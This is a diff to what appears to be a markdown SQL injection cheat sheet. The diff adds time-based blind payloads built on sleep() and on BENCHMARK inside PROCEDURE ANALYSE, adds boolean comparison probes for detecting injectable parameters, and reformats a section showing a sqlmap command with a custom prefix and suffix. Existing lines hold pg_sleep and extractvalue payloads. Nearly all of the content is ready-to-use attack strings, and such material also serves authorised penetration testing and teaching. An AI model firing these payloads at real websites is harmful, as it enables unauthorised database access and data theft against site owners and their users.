@@ -126,6 +126,12 @@ SQLInjection Basic Stuff
 9999"||(select 99999999 from pg_sleep(15))||"9999
 extractvalue('<xml>',concat("/",(select version())))
 '%2b(select%2afrom(select(sleep(8)))a)%2b'
+%2c(select*from(select(sleep(20)))a)
+# change benchmark and check timing
+%20PROCEDURE%20ANALYSE(EXTRACTVALUE(5591,CONCAT(0x5c,(BENCHMARK(10000000,MD5(0x79435a55))))),1)
+# Compare reposnses, if they differ then most likley injectable  
+1+AND+8167=8167
+1+AND+8167=8188
 ```
 Interesting items that can be used to prefix and suffix attacks
 ---------------------
@@ -150,7 +156,11 @@ prefix='('
 prefix='\xBF'''
 prefix='%bf%27'
 prefix=''''
-# Attack using the middle of the url
+```
+
+Attack using the middle of the url
+----------------------
+```bash
 sqlmap.py -p host -u "example.com?host=" --prefix "http://anotherexample.com?bar=1" --suffix "&restoftheurl=whatever"
 ```
 Sqlmap quick cheat sheet
